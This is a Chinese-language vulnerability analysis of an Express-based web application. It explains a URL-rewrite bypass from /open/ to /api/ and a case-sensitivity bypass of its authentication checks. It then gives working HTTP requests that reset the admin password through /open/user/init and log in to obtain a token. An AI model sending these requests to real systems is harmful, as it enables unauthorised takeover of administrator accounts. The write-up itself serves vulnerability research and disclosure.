<h2 class="md-end-block md-heading md-focus"><span class="md-plain">漏洞原理分析</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">漏洞一：URL 重写绕过</span></h3>
<p class="md-end-block md-p"><span class="md-plain">系统在处理请求时存在逻辑缺陷，</span><span class="md-pair-s" spellcheck="false"><code>/open/</code></span><span class="md-plain"> 路径被加入白名单后，经过内部重写可访问需要认证的 </span><span class="md-pair-s" spellcheck="false"><code>/api/</code></span><span class="md-plain"> 接口。</span></p>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">关键代码分析：</span></strong></span></p>



```typescript
// back/loaders/express.ts
app.use(async (req, res, next) => {
  if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
    return next();  // 非这两个前缀直接放行
  }
  // ... 认证逻辑
});
​
// 路径重写规则
app.use(rewrite('/open/*', '/api/$1'));  // /open/xxx → /api/xxx
```


<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">绕过思路：</span></strong></span> <span class="md-pair-s" spellcheck="false"><code>/open/user/init</code></span><span class="md-plain"> 在白名单中不被拦截，但被重写为 </span><span class="md-pair-s" spellcheck="false"><code>/api/user/init</code></span><span class="md-plain"> 后可执行敏感操作。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">漏洞二：大小写绕过</span></h3>
<p class="md-end-block md-p"><span class="md-plain">JWT 认证和自定义认证均使用小写匹配，而 Express 路由默认大小写不敏感。</span></p>



```typescript
// JWT 白名单正则仅匹配小写
path: [...config.apiWhiteList, /^\/(?!api\/).*/]
​
// 自定义认证严格匹配小写
if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
  return next();
}
​
// 但路由大小写不敏感
app.use('/api', routes());  // /API/ /aPi/ 均可匹配
```

<h2 class="md-end-block md-heading"><span class="md-plain">漏洞复现</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">Step 1：重置管理员密码</span></h3>
<p class="md-end-block md-p"><span class="md-plain">利用 URL 重写绕过，直接调用用户初始化接口：</span></p>



```http
PUT /open/user/init HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
​
{"username":"admin","password":"hack@qq.com"}
```


<p class="md-end-block md-p"></p>

<h3 class="md-end-block md-heading"><span class="md-plain">Step 2：成功登录获取 Token</span></h3>
<p class="md-end-block md-p"><span class="md-plain">使用重置后的密码登录系统：</span></p>



```http
POST /api/user/login HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
​
{"username":"admin","password":"hack@qq.com"}
```
